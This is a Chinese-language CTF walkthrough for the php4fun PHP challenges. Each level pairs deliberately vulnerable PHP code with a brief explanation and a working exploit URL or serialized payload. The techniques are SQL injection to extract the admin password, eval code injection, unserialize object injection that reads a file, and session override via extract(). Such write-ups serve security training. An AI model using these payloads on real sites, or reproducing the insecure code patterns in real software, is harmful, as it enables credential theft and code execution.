# php4fun.sinaapp.com PHP挑战通关攻略

challenge 1
-----------

* * *

php code：

```
#GOAL: get password from admin;
error_reporting(0);
require 'db.inc.php';

function clean($str){
    if(get_magic_quotes_gpc()){
        $str=stripslashes($str);
    }
    return htmlentities($str, ENT_QUOTES);
}

$username = @clean((string)$_GET['username']);
$password = @clean((string)$_GET['password']);

$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
$result=mysql_query($query);
if(!$result || mysql_num_rows($result) < 1){
    die('Invalid password!');
}

$row = mysql_fetch_assoc($result);

echo "Hello ".$row['name']."</br>";
echo "Your password is:".$row['pass']."</br>";

```

### 攻略：

在单引号内的mysql注入，核心就是逃脱单引号，要么生成一个(htmlentities了单引号，不太可能)，要么...干掉一个。

### 所以：

```
http://php4fun.sinaapp.com/c1/index.php?username=admin\&password=%20or%201%23

```

challenge 2
-----------

* * *

php code：

```
#GOAL: gather some phpinfo();

$str=@(string)$_GET['str'];
eval('$str="'.addslashes($str).'";');

```

### 攻略：

eval('$str="'.addslashes($str).'";');这段最后成为php代码 $str="**_"，_**里双引号被addslashes，但内容在双引号内可以${${这里执行代码}}

### 所以：

```
http://phpchallenges2.sinaapp.com/index.php?str=${${phpinfo()}}

```

challenge 3
-----------

* * *

php code:

```
# GOAL: dump the info for the secret id
require 'db.inc.php';

$id = @(float)$_GET['id'];

$secretId = 1;
if($id == $secretId){
    echo 'Invalid id ('.$id.').';
}
else{
    $query = 'SELECT * FROM users WHERE id = \''.$id.'\';';
    $result = mysql_query($query);
    $row = mysql_fetch_assoc($result);

    echo "id: ".$row['id']."</br>";
    echo "name:".$row['name']."</br>";
}

```

### 攻略：

主要是利用php和mysql对float数字型支持的精度不同，精度小的会忽略不能支持的位数。

### 所以：

```
http://php4fun.sinaapp.com/c3/index.php?id=1.0000000000001

```

challenge 4
-----------

* * *

php code:

```
#GOAL:get password from admin
# $yourInfo=array(
#   'id'    => 1,
#   'name'  => 'admin',
#   'pass'  => 'xxx',
#   'level' => 1
# );
require 'db.inc.php';

$_CONFIG['extraSecure']=true;

//if register globals = on, undo var overwrites
foreach(array('_GET','_POST','_REQUEST','_COOKIE') as $method){
     foreach($$method as $key=>$value){
          unset($$key);
     }
}

$kw = isset($_GET['kw']) ? trim($_GET['kw']) : die('Please enter in a search keyword.');

if($_CONFIG['extraSecure']){
     $kw=preg_replace('#[^a-z0-9_-]#i','',$kw);
}

$query = 'SELECT * FROM messages WHERE message LIKE \'%'.$kw.'%\';';

$result = mysql_query($query);
$row = mysql_fetch_assoc($result);

echo "id: ".$row['id']."</br>";
echo "message: ".$row['message']."</br>";

```

### 攻略：

这段$kw在单引号里，看起来只要能使用单引号就行，所以干掉_CONFIG['extraSecure']就ok，刚好前面画蛇添足的有可利用的变量unset(不然咋通关？)，然后就是联合查询了。

### 所以：

```
http://php4fun.sinaapp.com/c4/index.php?kw='%20and%200%20union%20select%20name,pass%20from%20users%20where%20id=1%23&_CONFIG=aaa

```

challenge 5
-----------

* * *

php code：

```
# GOAL: overwrite password for admin (id=1)
#       Try to login as admin
# $yourInfo=array( //this is your user data in the db
#   'id'    => 8,
#   'name'  => 'jimbo18714',
#   'pass'  => 'MAYBECHANGED',
#   'level' => 1
# );
require 'db.inc.php';

function mres($str) {
    return mysql_real_escape_string($str);
}

$userInfo = @unserialize($_GET['userInfo']);

$query = 'SELECT * FROM users WHERE id = \''.mres($userInfo['id']).'\' AND pass = \''.mres($userInfo['pass']).'\';';

$result = mysql_query($query);
if(!$result || mysql_num_rows($result) < 1){
    die('Invalid password!');
}

$row = mysql_fetch_assoc($result);
foreach($row as $key => $value){
    $userInfo[$key] = $value;
}

$oldPass = @$_GET['oldPass'];
$newPass = @$_GET['newPass'];
if($oldPass == $userInfo['pass']){
    $userInfo['pass'] = $newPass;
    $query = 'UPDATE users SET pass = \''.mres($newPass).'\' WHERE id = \''.mres($userInfo['id']).'\';';
    mysql_query($query);
    echo 'Password Changed.';
}
else{
    echo 'Invalid old password entered.';
}

```

### 攻略：

(1) http://www.80vul.com/webzine_0x06/PSTZine_0x06_0x03.txt (站上默认显示的密码就是个提示...估计是哪位大虾顺手改的) (2) $userInfo['pass'] = $newPass; //这句，改成1

### 所以：

(1) 修改jimbo18714密码为8 (2) 再次修改密码，提交时userInfo为8的序列化,newPass为1

challenge 6
-----------

* * *

php code：

```
#GOAL: get the secret;

class just4fun {
    var $enter;
    var $secret;
}

if (isset($_GET['pass'])) {
    $pass = $_GET['pass'];

    if(get_magic_quotes_gpc()){
        $pass=stripslashes($pass);
    }

    $o = unserialize($pass);

    if ($o) {
        $o->secret = "?????????????????????????????";
        if ($o->secret === $o->enter)
            echo "Congratulation! Here is my secret: ".$o->secret;
        else 
            echo "Oh no... You can't fool me";
    }
    else echo "are you trolling?";
}

```

攻略：
---

serialize一个just4fun的对象，序列化之前先赋值给$o->enter (在本地执行是成功的，php4fun.sinaapp.com不行，代码改了？)

所以：

(1) 生成序列化的对象

```
class just4fun {
    var $enter;
    var $secret;
}

$a=new just4fun();
$a->enter='?????????????????????????????';
echo urlencode(serialize($a));

```

(2)

```
link?pass=O%3A8%3A%22just4fun%22%3A2%3A%7Bs%3A5%3A%22enter%22%3Bs%3A29%3A%22%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%22%3Bs%3A6%3A%22secret%22%3BN%3B%7D

```

challenge 7
-----------

* * *

php code:

```
# GOAL: get the key from $hidden_password[207]

session_start();
error_reporting(0);

function auth($password, $hidden_password) {
    $res = 0;
    if(isset($password) && $password != "") {
        if($password == $hidden_password) {
            $res = 1;
        }
    }
    $_SESSION["logged"] = $res;
    return $res;
}

function display($res){
    $aff = htmlentities($res);
    return $aff;
}


if(!isset($_SESSION["logged"]))
    $_SESSION["logged"] = 0;

$aff = "";
include("config.inc.php");

foreach($_REQUEST as $request) {
    if(is_array($request)) {
        die("Can not use Array in request!");
    }
}

$password = $_POST["password"];

if(!ini_get("register_globals")) {
    $superglobals = array($_POST, $_GET);
    if(isset($_SESSION)) {
        array_unshift($superglobals, $_SESSION);
    }
    foreach($superglobals as $superglobal) {
        extract($superglobal, 0);
    }
}

if((isset($password) && $password != "" && auth($password, $hidden_password[207]) == 1) || (is_array($_SESSION) && $_SESSION["logged"] == 1)) {
    $aff = display("$hidden_password[207]");
} else {
    $aff = display("Try again");
}
echo $aff;

```

### 攻略：

get the key from $hidden_password[207] 这句有点模糊，下面的‘所以’可以得到key（绕过REQUEST对数组的判断）

### 所以：

```
http://php4fun.sinaapp.com/c7/index.php?_SESSION[logged]=1
POST: _SESSION=1

```

challenge 8
-----------

* * *

php code：

```
#GOAL: file_get_content('sbztz.php')    : )

    class just4fun {
        public $filename;

        function __toString() {
            return @file_get_contents($this->filename);
        }
    }

    $data = stripslashes($_GET['data']);
    if (!$data) {
        die("hello from y");
    }

    $token = $data[0];
    $pass = true; 

    switch ( $token ) {
        case 'a' :
        case 'O' :
        case 'b' :
        case 'i' :
        case 'd' :
            $pass = ! (bool) preg_match( "/^{$token}:[0-9]+:/s", $data );
            break;

        default:
            $pass = false;

    }

    if (!$pass) {
      die("TKS L.N.");
    }

    echo unserialize($data); 

```

### 攻略：

[http://drops.wooyun.org/papers/596](http://drops.wooyun.org/papers/596)

[http://zone.wooyun.org/content/6697](http://zone.wooyun.org/content/6697)

### 所以：

(1) 生成利用的data:

```
O%3A%2B8%3A"just4fun"%3A1%3A%7Bs%3A8%3A"filename"%3Bs%3A9%3A"sbztz.php"%3B%7D  (注意%2B)

```

(2)

```
http://php4fun.sinaapp.com/c8/index.php?data=O%3A%2B8%3A"just4fun"%3A1%3A%7Bs%3A8%3A"filename"%3Bs%3A9%3A"sbztz.php"%3B%7D

```